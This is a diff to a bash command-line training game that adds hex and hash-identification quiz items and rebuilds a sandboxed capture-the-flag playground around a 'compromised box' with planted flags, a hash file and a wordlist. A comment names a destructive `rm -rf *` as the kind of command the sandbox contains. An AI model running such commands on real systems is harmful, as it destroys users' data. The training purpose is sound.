-  questions+=("Convert hex back to ascii§echo '68656c6c6f' | xxd -r -p§echo -n '68656c6c6f' | xxd -r -p§echo 68656c6c6f | xxd -r -p§echo -n 68656c6c6f | xxd -r -p§printf '68656c6c6f' | xxd -r -p§printf 68656c6c6f | xxd -r -p§printf '%s' '68656c6c6f' | xxd -r -p§printf '%s' 68656c6c6f | xxd -r -p§printf '%s' \"68656c6c6f\" | xxd -r -p§printf \"%s\" \"68656c6c6f\" | xxd -r -p")
+  questions+=("Convert hex ${W}68656c6c6f${C} back to ascii§echo '68656c6c6f' | xxd -r -p§echo -n '68656c6c6f' | xxd -r -p§echo 68656c6c6f | xxd -r -p§echo -n 68656c6c6f | xxd -r -p§printf '68656c6c6f' | xxd -r -p§printf 68656c6c6f | xxd -r -p§printf '%s' '68656c6c6f' | xxd -r -p§printf '%s' 68656c6c6f | xxd -r -p§printf '%s' \"68656c6c6f\" | xxd -r -p§printf \"%s\" \"68656c6c6f\" | xxd -r -p")
   questions+=("Hex dump ${W}${bin}${C} with addresses|xxd ${bin}|hexdump -C ${bin}|hd ${bin}|od -A x -t x1z ${bin}")
   questions+=("Hex dump ${W}${bin}${C} (no addresses)|xxd -p ${bin}|xxd --plain ${bin}|xxd -ps ${bin}")
   questions+=("Identify hash type in ${W}${hash}${C}|hashid ${hash}|hashid -m ${hash}|hashcat --identify ${hash}")
@@ -5974,62 +6105,141 @@ _practice_menu() {
   done
 }
 
-# Free-play playground: a safe bubblewrap REPL over the sandbox fixtures. Type any
-# command, see its real output; Tab explains what YOU typed (not a question's answer).
-# Destructive commands only touch the throwaway sandbox and are reset between runs.
+# Free-play playground: a real bubblewrap shell over a compromised-box fixture tree.
+# Three things make it a playground rather than a command box:
+#   - its OWN tree (_gen_play_files, mktemp), so nothing typed here can shift a graded
+#     level's fixtures, and destructive commands need no guard rails at all;
+#   - state PERSISTS between commands (cd, writes, deletes) - it used to reset before
+#     every single command, which meant `cd logs` then `ls` showed the wrong dir and
+#     nothing you built survived long enough to use. `reset` restores on demand;
+#   - a goal: three flag{...} tokens planted in the tree, tracked in the header, with a
+#     mission card on entry so arriving here isn't a blank prompt with no idea what to do.
+# Tab explains what YOU typed (not a question's answer).
+_play_card() {
+  local _f=$1
+  printf '%s\e[2J\e[H%s\n\n' "$_SY" "${M}${B}${_H3} PLAYGROUND ${_H3}${N}"
+  printf '%s\n' "${D}a real shell in a sandbox. every command actually runs. nothing is graded,${N}" \
+                "${D}nothing can touch your machine, and you cannot break anything that matters.${N}" ''
+  printf '%s\n\n' "${W}the box:${N} ${D}someone got in. the mess is still on disk.${N}"
+  printf '%s %s\n' "${Y}${B}3 flags${N}" "${D}are hidden in the tree, each looks like ${C}flag{...}${D} - found ${W}${_f}${D}/3${N}"
+  printf '  %s  %s\n' "${W}1${N}" "${D}a file that isn't text        ${C}samples/${N}"
+  printf '  %s  %s\n' "${W}2${N}" "${D}encoded, not encrypted        ${C}vault/${N}"
+  printf '  %s  %s\n\n' "${W}3${N}" "${D}packed, not deleted           ${C}archive/${N}"
+  printf '%s\n' "${W}start here:${N}"
+  printf '  %-34s %s\n' "${C}ls -la${N}" "${D}dotfiles are where it starts${N}"
+  printf '  %-34s %s\n' "${C}cat .bash_history${N}" "${D}what the intruder typed${N}"
+  printf '  %-34s %s\n' "${C}file * samples/*${N}" "${D}what am i even looking at${N}"
+  printf '  %-34s %s\n' "${C}grep -rn flag . 2>/dev/null${N}" "${D}the loud way (finds one of three)${N}"
+  printf '  %-34s %s\n\n' "${C}find . -perm -002 -type f${N}" "${D}what is world-writable and why${N}"
+  printf '%s\n' "${D}also here: ${C}incident/${D} (auth.log, crontab, passwd), ${C}vault/hashes.txt${D} + a${N}" \
+                "${D}wordlist, ${C}junk/${D} for find|xargs, ${C}big.log${D} for head/tail/wc, and a locked file.${N}" ''
+  printf '%s\n' "${D}${C}reset${D} restores the box   ${C}?${D} this card   ${C}Tab${D} explains your command   ${C}q${D} back${N}"
+  _pause
+}
+
 play() {
   if ! ((SANDBOX_MODE)) || ! _check_bwrap; then
     printf '%s\e[2J\e[H%s\n\n%s\n%s' "$_SY" "${M}${B}${_H3} PLAYGROUND ${_H3}${N}" \
       "${Y}The playground needs bubblewrap${N} ${D}- it runs your commands in a real sandbox.${N}" "$_SN"
     _pause; return
   fi
+  # Own tree, same isolation the gauntlet uses: the playground never writes to the shared
+  # sandbox, so a stray `rm -rf *` here cannot leak into a graded level - and that is what
+  # lets state persist between commands instead of resetting before each one.
+  local _save_sd=$SANDBOX_DIR _save_pr=$SANDBOX_PRISTINE
+  printf '%s\e[2J\e[H%s\n\n%s%s' "$_SY" "${M}${B}${_H3} PLAYGROUND ${_H3}${N}" "${D}building the box...${N}" "$_SN"
+  _PLAY_DIR=$(mktemp -d "${TMPDIR:-/tmp}/cmdchamp.XXXXXX" 2>/dev/null) || { printf '\n%s\n' "${R}no temp dir${N}"; _pause; return; }
+  if ! _gen_play_files "$_PLAY_DIR" 2>/dev/null; then _play_cleanup; printf '\n%s\n' "${R}could not build the sandbox${N}"; _pause; return; fi
+  if _PLAY_PRISTINE=$(mktemp -d "${TMPDIR:-/tmp}/cmdchamp.XXXXXX" 2>/dev/null) && cp -a "$_PLAY_DIR/." "$_PLAY_PRISTINE/" 2>/dev/null; then
+    SANDBOX_PRISTINE=$_PLAY_PRISTINE
+  else
+    _PLAY_PRISTINE=""; SANDBOX_PRISTINE=$_PLAY_DIR  # no pristine copy: `reset` becomes a no-op, never a wipe
+  fi
+  SANDBOX_DIR=$_PLAY_DIR
+  _play_lock "$SANDBOX_DIR"
   _session_init; _mode_init play
   _PLAY_EXPLAIN=1
-  # Open on a real listing instead of a hand-kept file list: the fixture tree gets
-  # new files, a hardcoded line does not (the old one had drifted eight files out
-  # of date and overflowed 80 columns), and it shows on arrival that what you type
-  # really runs. TABSIZE=0 makes ls pad its columns with spaces, not tabs.
-  _COLS; local _last
+  local -A _flags=(); local _cwd="" _last _note=""
+  _play_card 0
+  # Open on a real listing instead of a hand-kept file list: the fixture tree gets new
+  # files, a hardcoded line does not, and it shows on arrival that what you type really
+  # runs. TABSIZE=0 makes ls pad its columns with spaces, not tabs.
+  _COLS
   _last="${D}\$ ls${N}"$'\n'"$(_sandbox_exec "TABSIZE=0 ls -CF -w $((REPLY > 20 ? REPLY - 1 : 79))" 5 2>&1 | head -n 8)"
   while true; do
     _REDRAW_HDR() {
-      printf '%s\e[H%s   %s\e[K\n' "$_SY" "${M}${B}PLAYGROUND${N}" "${D}type a command, watch it run for real - nothing to break${N}"
-      printf '%s\e[K\n\e[K\n' "${D}${C}Tab${D} explains your command   ${C}${_GUP}${_GDN}${D} history   ${C}q${D} quits${N}"
-      printf '%s\e[K\n' "${D}--- output (every command starts from the same fresh files) ---${N}"
+      local _fc=${#_flags[@]} _fcol=$D; ((_fc)) && _fcol=$G; ((_fc >= 3)) && _fcol="${G}${B}"
+      printf '%s\e[H%s %s  %s\e[K\n' "$_SY" "${M}${B}PLAYGROUND${N}" "${C}~${_cwd}${N}" "${_fcol}flags ${_fc}/3${N}"
+      printf '%s\e[K\n\e[K\n' "${D}${C}Tab${D} explains your command  ${C}?${D} mission  ${C}reset${D} restores  ${C}q${D} quits${N}"
+      printf '%s\e[K\n' "${D}--- output ---${N}"
       printf '\e[K\n%s\e[K\n' "$_last"
+      [[ -n "$_note" ]] && printf '\e[K\n%s\e[K\n' "$_note"
       printf '\e[K\n%s\e[K\n%s' "${D}--- your command ---${N}" "$_SN"
     }
     printf '\e[2J'; _REDRAW_HDR
     _read_line 1 1
     ((_QUIT)) && break
     [[ -z "$input" ]] && continue
-    case "$input" in q|quit|exit) break;; esac
-    # Reset to pristine before EACH command: play bypasses check()/_sandbox_validate, so
-    # it never sets _SANDBOX_DESTRUCTIVE — without this a stray rm would persist and leak
-    # into normal play. Stateless is also the safest promise for a "nothing to break" REPL.
-    _sandbox_reset
-    _last=$(_sandbox_exec "$input" 5 2>&1 | head -n 12)
-    # Full-screen/interactive TUIs can't draw here: the sandbox has no controlling terminal
-    # (stdin /dev/null, --new-session), so they fail "failed tty get" etc. Detect that AFTER
-    # running (so batch forms like `top -bn1` still work) and point at a one-shot form.
+    case "$input" in
+      q|quit|exit) break;;
+      '?'|help) _play_card "${#_flags[@]}"; continue;;
+      reset) _sandbox_reset && _play_lock "$SANDBOX_DIR"; _cwd=""; _note=""
+             _last="${D}\$ reset${N}"$'\n'"${G}box restored${N} ${D}- every file back the way you found it (flags stay found)${N}"
+             continue;;
+    esac
+    # cd has to survive: every command is a fresh bwrap, so the shell's own $PWD dies with
+    # it. Run the command from the tracked dir, then have it write the resulting $PWD to a
+    # dropfile the host reads and deletes before the next command - so the marker is never
+    # on disk while a user command is running, and never shows up in an `ls -la`.
+    rm -f "$SANDBOX_DIR/.cc_pwd"
+    local _wrapped="cd '/sandbox${_cwd}' 2>/dev/null || cd /sandbox"$'\n'"$input"$'\n''printf %s "$PWD" > /sandbox/.cc_pwd 2>/dev/null'
+    # 200 lines is the memory bound (head SIGPIPEs a runaway producer); 12 is what fits.
+    local _raw; _raw=$(_sandbox_exec "$_wrapped" 8 2>&1 | head -n 200)
+    local _newpwd=""; [[ -f "$SANDBOX_DIR/.cc_pwd" ]] && _newpwd=$(<"$SANDBOX_DIR/.cc_pwd")
+    rm -f "$SANDBOX_DIR/.cc_pwd"
+    # Only accept a plain path under /sandbox - anything else (a dir with a quote in its
+    # name, a truncated write) keeps the old cwd rather than building a broken cd.
+    if [[ "$_newpwd" == /sandbox ]]; then _cwd=""
+    elif [[ "$_newpwd" =~ ^/sandbox(/[A-Za-z0-9._-]+)+$ ]]; then _cwd="${_newpwd#/sandbox}"; fi
+    # Flags count the moment they appear in output, however you got them there.
+    local _hit; while read -r _hit; do [[ -n "$_hit" ]] && _flags[$_hit]=1; done < <(grep -oa 'flag{[^}]*}' <<< "$_raw" 2>/dev/null)
+    local _nl=0; [[ -n "$_raw" ]] && _nl=$(grep -c '' <<< "$_raw")
+    _last=$(head -n 12 <<< "$_raw")
+    _note=""
+    ((_nl > 12)) && _note="${D}... ${_nl} lines shown as 12 - pipe it: ${C}${input} | head${D} or ${C}| less${N}"
     _trim "$input"; local _c0=${REPLY%%[[:space:]]*}; _c0=${_c0##*/}
     # Full-screen programs need a terminal the sandbox deliberately lacks (stdin /dev/null,
     # --new-session), so they fail "failed tty get" etc. Detect that AFTER running (batch
     # forms like `top -bn1` still work) and point at the right surface instead.
     case " vi vim nvim nano emacs joe view " in
       *" $_c0 "*) if [[ "$_last" == *"failed tty get"* || "$_last" == *"Inappropriate ioctl"* || "$_last" == *"terminal"* || "$_last" == *"not a tty"* || "$_last" == *"command not found"* ]]; then
-          _last="${Y}${_c0}${N} ${D}can't open here — but cmdchamp's own answer line IS a vi editor: press ${C}Esc${D} for normal mode, ${C}?${D} for every binding. the playground runs non-interactive commands.${N}"
+          _last="${Y}${_c0}${N} ${D}can't open here — but cmdchamp's own answer line IS a vi editor: press ${C}Esc${D} for normal mode, ${C}?${D} for every binding. the playground runs non-interactive commands.${N}"; _note=""
         fi;; esac
     case " top htop atop iotop btop bashtop watch tmux screen byobu " in
       *" $_c0 "*) if [[ "$_last" == *"failed tty get"* || "$_last" == *"Inappropriate ioctl"* || "$_last" == *"terminal"* || "$_last" == *"not a tty"* ]]; then
-          _last="${Y}${_c0}${N} ${D}needs a terminal the playground has none of. try a one-shot form: ${C}top -bn1${D}, ${C}ps aux${D}, or ${C}free -h${D}.${N}"
+          _last="${Y}${_c0}${N} ${D}needs a terminal the playground has none of. try a one-shot form: ${C}top -bn1${D}, ${C}ps aux${D}, or ${C}free -h${D}.${N}"; _note=""
         fi;; esac
     [[ -z "$_last" ]] && _last="${D}(no output)${N}"
     _last="${D}\$ ${input}${N}"$'\n'"$_last"   # the prompt line is cleared on Enter - keep
                                               # the command visible above what it printed
   done
-  _sandbox_reset  # leave the shared sandbox clean for the game
+  if ((${#_flags[@]} >= 3)); then
+    printf '%s\e[2J\e[H%s\n\n%s\n\n' "$_SY" "${G}${B}${_H3} ALL 3 FLAGS ${_H3}${N}" "${D}you took the box apart with nothing but a shell.${N}"
+    local _f; for _f in "${!_flags[@]}"; do printf '  %s\n' "${G}${_f}${N}"; done
+    printf '\n%s' "$_SN"; _pause
+  fi
   _PLAY_EXPLAIN=0
+  SANDBOX_DIR=$_save_sd; SANDBOX_PRISTINE=$_save_pr
+  _play_cleanup
+}
+
+# Reaps the playground's own tree. Also called from _cleanup so a signal mid-session
+# can't leave two mktemp dirs behind in /tmp.
+_play_cleanup() {
+  [[ -n "${_PLAY_DIR:-}" ]] && rm -rf "$_PLAY_DIR" 2>/dev/null
+  [[ -n "${_PLAY_PRISTINE:-}" ]] && rm -rf "$_PLAY_PRISTINE" 2>/dev/null
+  _PLAY_DIR="" _PLAY_PRISTINE=""
+  return 0
 }
 
 
